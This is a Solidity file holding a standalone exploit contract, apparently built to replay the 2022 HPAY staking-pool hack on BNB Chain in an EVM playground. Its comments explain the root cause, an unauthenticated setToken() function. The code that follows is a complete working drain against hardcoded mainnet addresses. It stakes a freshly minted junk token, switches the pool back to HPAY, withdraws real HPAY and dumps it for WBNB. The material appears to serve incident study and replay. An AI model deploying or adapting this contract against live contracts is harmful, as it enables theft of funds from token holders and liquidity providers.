// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2022-10-HPAY).
//
// The DeFiHackLabs PoC (test/HPAY_exp.sol) runs the attack INLINE in the Foundry
// `ContractTest` — `attacker = address(this)`, the whole sequence (mint junk,
// setToken→stake→setToken→withdraw→swap) lives in `testExploit()`, and the
// `SHITCOIN` junk token is a second contract in the same file. There is no
// standalone exploit contract to deploy, so the playground cannot record a
// single `attack()` call. This contract is a faithful, self-contained copy of
// that inline attack so the playground can deploy it and record `run()`.
//
// The block advance (`vm.roll(block.number + 1000)` in the test, needed so the
// reward accrues) is reproduced at the playground level via `setup.blockNumber`
// = forkBlock + 1000 — the recorder uses one fixed block for the whole replay.
//
// Logic and constants copied verbatim from test/HPAY_exp.sol.
// Root cause: `MintableAutoCompundRelockBonus.setToken()` is public and
// unauthenticated, so anyone can swap the staking/reward token pointer between
// deposit and withdrawal — deposit junk, withdraw real HPAY.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
}

interface IWBNB is IERC20 {
    function deposit() external payable;
    function withdraw(uint256) external;
}

interface IUniswapV2Router {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface IMintableAutoCompundRelockBonus {
    function setToken(address) external;
    function stake(uint256) external;
    function withdraw(uint256) external;
}

contract HPAYDrain {
    IERC20 constant HPAY_TOKEN = IERC20(0xC75aa1Fa199EaC5adaBC832eA4522Cff6dFd521A);
    IWBNB constant WBNB_TOKEN = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
    IUniswapV2Router constant PS_ROUTER = IUniswapV2Router(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    IMintableAutoCompundRelockBonus constant BONUS =
        IMintableAutoCompundRelockBonus(0xF8bC1434f3C5a7af0BE18c00C675F7B034a002F0);

    function run() external {
        // Approve the router to spend HPAY (for the final dump).
        HPAY_TOKEN.approve(address(PS_ROUTER), type(uint256).max);

        // 1. Mint a worthless junk token to use as the "stake".
        SHITCOIN shitcoin = new SHITCOIN();
        shitcoin.mint(100_000_000 * 1e18);

        // 2. Point the pool at the junk token (no auth!), then stake it.
        //    The pool credits the attacker ~98,000,000 abstract "stake units".
        BONUS.setToken(address(shitcoin));
        shitcoin.approve(address(BONUS), type(uint256).max);
        BONUS.stake(shitcoin.balanceOf(address(this)));

        // (vm.roll(block.number + 1000) is reproduced via setup.blockNumber.)

        // 3. Flip the pool's token pointer back to real HPAY — the credited
        //    units are unchanged but now redeem for HPAY instead of junk.
        BONUS.setToken(address(HPAY_TOKEN));

        // 4. Withdraw 30,000,000 units; the pool pays out in HPAY (minting to
        //    cover the payout if needed, since it holds MINTER_ROLE on HPAY).
        BONUS.withdraw(30_000_000 * 1e18);

        // 5. Dump the looted HPAY into the HPAY/WBNB pair for WBNB.
        _HPAYToWBNB();
    }

    function _HPAYToWBNB() internal {
        address[] memory path = new address[](2);
        path[0] = address(HPAY_TOKEN);
        path[1] = address(WBNB_TOKEN);
        PS_ROUTER.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            HPAY_TOKEN.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );
    }
}

// Verbatim copy of the junk ERC20 from test/HPAY_exp.sol.
contract SHITCOIN {
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    string public name = "SHIT COIN";
    string public symbol = "SHIT";
    uint8 public decimals = 18;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    function transfer(address recipient, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[recipient] += amount;
        emit Transfer(msg.sender, recipient, amount);
        return true;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool) {
        allowance[sender][msg.sender] -= amount;
        balanceOf[sender] -= amount;
        balanceOf[recipient] += amount;
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function mint(uint256 amount) external {
        balanceOf[msg.sender] += amount;
        totalSupply += amount;
        emit Transfer(address(0), msg.sender, amount);
    }

    function burn(uint256 amount) external {
        balanceOf[msg.sender] -= amount;
        totalSupply -= amount;
        emit Transfer(msg.sender, address(0), amount);
    }
}
